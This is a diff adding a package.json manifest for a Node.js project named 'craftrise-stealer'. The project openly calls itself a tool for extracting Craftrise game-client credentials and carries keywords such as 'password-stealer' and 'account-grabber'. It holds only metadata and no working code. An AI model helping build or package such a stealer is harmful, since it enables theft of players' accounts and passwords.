@@ -1,0 +1,41 @@
+{
+  "name": "craftrise-stealer",
+  "version": "2.0.0",
+  "description": "Craftrise client credential extraction tool",
+  "main": "main.js",
+  "scripts": {
+    "start": "node main.js"
+  },
+  "keywords": [
+    "craftrise",
+    "craftrise-stealer",
+    "craftrise-account-stealer",
+    "craftrise-account-grabber",
+    "craftrise-grabber",
+    "account-stealer",
+    "credential-extraction",
+    "password-stealer"
+  ],
+  "author": "Fatih1963",
+  "license": "Apache-2.0",
+  "engines": {
+    "node": ">=20.0.0"
+  },
+  "os": [
+    "win32"
+  ],
+  "cpu": [
+    "x64"
+  ],
+  "dependencies": {
+    "axios": "^1.10.0"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/Fatih1963/craftrise-stealer.git"
+  },
+  "bugs": {
+    "url": "https://github.com/Fatih1963/craftrise-stealer/issues"
+  },
+  "homepage": "https://github.com/Fatih1963/craftrise-stealer#readme"
+}
